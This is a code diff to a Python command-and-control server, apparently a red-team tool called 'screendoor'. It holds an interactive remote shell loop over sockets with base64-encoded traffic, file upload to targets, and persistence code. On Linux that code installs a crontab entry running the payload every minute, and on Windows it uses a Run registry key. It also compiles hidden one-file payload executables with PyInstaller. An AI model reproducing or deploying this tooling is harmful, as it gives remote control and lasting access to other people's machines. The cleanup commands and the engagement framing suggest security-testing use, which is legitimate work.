@@ -21,7 +21,7 @@ def comm_in(targ_id):
     :return:
     """
 
-    info("Waiting for Response..\n")
+    process("Waiting for Response...")
     response = targ_id.recv(4096).decode()
     response = base64.b64decode(response)
     response = response.decode().strip()
@@ -65,8 +65,6 @@ def target_comm(targ_id, targets, num):
 
     while True:
         message = input(Fore.YELLOW + f"{targets[num][3]}@{targets[num][1]}$ " + Style.RESET_ALL)
-        comm_out(targ_id, message)
-
         if message == 'help' or message == 'h':
             pass
         if len(message) == 0:
@@ -74,7 +72,6 @@ def target_comm(targ_id, targets, num):
 
         else:
             comm_out(targ_id, message)
-
             # Exit
             if message == 'exit':
                 message = base64.b64encode(message.encode())
@@ -88,6 +85,7 @@ def target_comm(targ_id, targets, num):
             if message == 'background' or message == 'bg':
                 break
 
+            # Work in progress
             if message == 'upload' or message == 'up':
                 file_name = input(Fore.BLUE + "[i] Enter File Name: " + Style.RESET_ALL)
                 file = open(file_name, 'rb')
@@ -112,13 +110,13 @@ def target_comm(targ_id, targets, num):
                     # Always keep a command to clean up endpoints after an engagement
                     process("Run this command to cleanup the registry: \nreg delete "
                             "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
+                    success("Persistence Technique Completed")
 
                 if targets[num][6] == 2:
                     persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                     targ_id.send(persist_command.encode())
                     process("Run this command to clean up crontab: \n crontab -r")
-
-                success("Persistence Technique Completed")
+                    success("Persistence Technique Completed")
 
             else:
                 response = comm_in(targ_id)
@@ -344,7 +342,7 @@ def exeplant():
 
     # PyInstaller Command Handling
     pyinstaller_exec = f'pyinstaller "Generated Payloads\\{file_name}" -w --clean --onefile --distpath .'
-    info(f"Generating Executable {exe_file}...")
+    process(f"Generating Executable {exe_file}...")
     subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
     os.remove(f'{ran_name}.spec')
     shutil.rmtree('build')
@@ -519,8 +517,11 @@ if __name__ == "__main__":
                 if quit_message == 'y' or quit_message == 'yes':
                     # Delete Payloads
                     process("Deleting Payloads")
-                    if os.path.exists('Generated Payloads'):
-                        shutil.rmtree('Generated Payloads')
+                    try:
+                        if os.path.exists('Generated Payloads'):
+                            shutil.rmtree('Generated Payloads')
+                    except PermissionError:
+                        break
                     tar_length = len(targets)
                     for target in targets:
                         if target[7] == 'Dead':
@@ -540,8 +541,12 @@ if __name__ == "__main__":
                 tar_length = len(targets)
                 # Delete Payloads
                 process("Deleting Payloads")
-                if os.path.exists('Generated Payloads'):
-                    shutil.rmtree('Generated Payloads')
+                try:
+                    if os.path.exists('Generated Payloads'):
+                        shutil.rmtree('Generated Payloads')
+                except PermissionError:
+                    error("Permission Denied - Payload is still running")
+                    break
                 for target in targets:
                     if target[7] == 'Dead':
                         pass
